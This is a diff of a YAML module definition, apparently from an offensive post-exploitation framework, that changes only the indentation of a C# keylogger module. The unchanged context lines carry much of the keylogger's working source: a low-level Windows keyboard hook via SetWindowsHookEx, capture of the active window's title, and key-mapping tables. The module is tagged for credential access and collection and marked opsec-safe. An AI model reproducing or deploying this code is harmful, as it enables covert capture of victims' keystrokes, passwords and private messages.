@@ -1,11 +1,11 @@
 name: Keylogger
 authors:
-- name: Anthony Rose
-  handle: Cx01N
-  link: https://twitter.com/Cx01N_
+  - name: Anthony Rose
+    handle: Cx01N
+    link: https://twitter.com/Cx01N_
 description: Monitor the keystrokes for a specified period of time.
 software: ''
-tactics: [TA0006,TA0009]
+tactics: [TA0006, TA0009]
 techniques: [T1056.001]
 background: false
 output_extension: ''
@@ -14,23 +14,23 @@ opsec_safe: true
 language: csharp
 min_language_version: ''
 options:
-- name: Time
-  description: Specifies the number of seconds to run the keylogger for.
-  required: false
-  value: '0'
-  strict: false
-  suggested_values:
-  - '0'
-  - '10'
-  - '20'
-  - '30'
-  - '60'
-  - '120'
+  - name: Time
+    description: Specifies the number of seconds to run the keylogger for.
+    required: false
+    value: '0'
+    strict: false
+    suggested_values:
+      - '0'
+      - '10'
+      - '20'
+      - '30'
+      - '60'
+      - '120'
 csharp:
   UnsafeCompile: false
   CompatibleDotNetVersions:
-  - Net35
-  - Net40
+    - Net35
+    - Net40
   Code: |
     using System;
     using System.IO;
@@ -40,7 +40,7 @@ csharp:
     using System.Collections.Generic;
     using System.Runtime.InteropServices;
     using Forms = System.Windows.Forms;
-    
+
     public static class Program
     {
         public static void Main(string[] args)
@@ -51,15 +51,15 @@ csharp:
             Console.WriteLine(result);
         }
     }
-    
+
     public class Keylogger
     {
         private static HookProc hookproc;
-    
+
         public static string StartKeylogger(int Seconds)
         {
             Console.WriteLine(String.Format("Starting keylogger for {0} seconds.", Seconds));
-    
+
             IntPtr HookID = IntPtr.Zero;
             string PreviousActiveWindow = "";
             hookproc = (nCode, wParam, lParam) =>
@@ -127,46 +127,46 @@ csharp:
             }
             return "";
         }
-    
+
         private static int WH_KEYBOARD_LL { get; } = 13;
         private static int WM_KEYDOWN { get; } = 0x0100;
-    
+
         [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
         private static extern IntPtr SetWindowsHookEx(int idHook, HookProc lpfn, IntPtr hMod, uint dwThreadId);
-    
+
         [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
         private static extern bool UnhookWindowsHookEx(IntPtr hhk);
-    
+
         [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
         private static extern int GetKeyState(int nVirtKey);
-    
+
         [DllImport("kernel32.dll", CharSet = CharSet.Auto)]
         private static extern IntPtr GetModuleHandle(string lpModuleName);
-    
+
         [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
         private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);
-    
+
         [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
         private static extern IntPtr GetForegroundWindow();
-    
+
         [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
         private static extern int GetWindowText(IntPtr hWnd, StringBuilder text, int count);
-    
+
         private delegate IntPtr HookProc(int nCode, IntPtr wParam, IntPtr lParam);
-    
+
         private static string GetActiveWindowTitle()
         {
             const int capacity = 256;
             StringBuilder builder = new StringBuilder(capacity);
             IntPtr handle = GetForegroundWindow();
-    
+
             if (GetWindowText(handle, builder, capacity) > 0)
             {
                 return builder.ToString();
             }
             return null;
         }
-    
+
         private static IDictionary<Keys, string> KeyDict { get; } = new Dictionary<Keys, string>
         {
             { Keys.Attn, "[Attn]" },
@@ -230,7 +230,7 @@ csharp:
             { Keys.NumPad8, "8" },
             { Keys.NumPad9, "9" },
         };
-    
+
         private static IDictionary<Keys, string> KeyDictShift { get; } = new Dictionary<Keys, string>
         {
             { Keys.D0, ")" },
@@ -254,7 +254,7 @@ csharp:
             { Keys.OemCloseBrackets, "}" },
             { Keys.OemOpenBrackets, "{" }
         };
-    
+
         [Flags]
         private enum Keys
         {
@@ -372,7 +372,7 @@ csharp:
             LControlKey = 162,
             RControlKey = 163,
         }
-    
+
         [StructLayout(LayoutKind.Sequential)]
         internal struct KbDllHookStruct
         {
@@ -385,28 +385,28 @@ csharp:
     }
   ReferenceSourceLibraries: []
   ReferenceAssemblies:
-  - Name: mscorlib.dll
-    Location: net40\mscorlib.dll
-    DotNetVersion: Net40
-  - Name: System.dll
-    Location: net40\System.dll
-    DotNetVersion: Net40
-  - Name: System.Core.dll
-    Location: net40\System.Core.dll
-    DotNetVersion: Net40
-  - Name: System.Windows.Forms.dll
-    Location: net40\System.Windows.Forms.dll
-    DotNetVersion: Net40
-  - Name: mscorlib.dll
-    Location: net35\mscorlib.dll
-    DotNetVersion: Net35
-  - Name: System.dll
-    Location: net35\System.dll
-    DotNetVersion: Net35
-  - Name: System.Core.dll
-    Location: net35\System.Core.dll
-    DotNetVersion: Net35
-  - Name: System.Windows.Forms.dll
-    Location: net35\System.Windows.Forms.dll
-    DotNetVersion: Net35
+    - Name: mscorlib.dll
+      Location: net40\mscorlib.dll
+      DotNetVersion: Net40
+    - Name: System.dll
+      Location: net40\System.dll
+      DotNetVersion: Net40
+    - Name: System.Core.dll
+      Location: net40\System.Core.dll
+      DotNetVersion: Net40
+    - Name: System.Windows.Forms.dll
+      Location: net40\System.Windows.Forms.dll
+      DotNetVersion: Net40
+    - Name: mscorlib.dll
+      Location: net35\mscorlib.dll
+      DotNetVersion: Net35
+    - Name: System.dll
+      Location: net35\System.dll
+      DotNetVersion: Net35
+    - Name: System.Core.dll
+      Location: net35\System.Core.dll
+      DotNetVersion: Net35
+    - Name: System.Windows.Forms.dll
+      Location: net35\System.Windows.Forms.dll
+      DotNetVersion: Net35
   EmbeddedResources: []
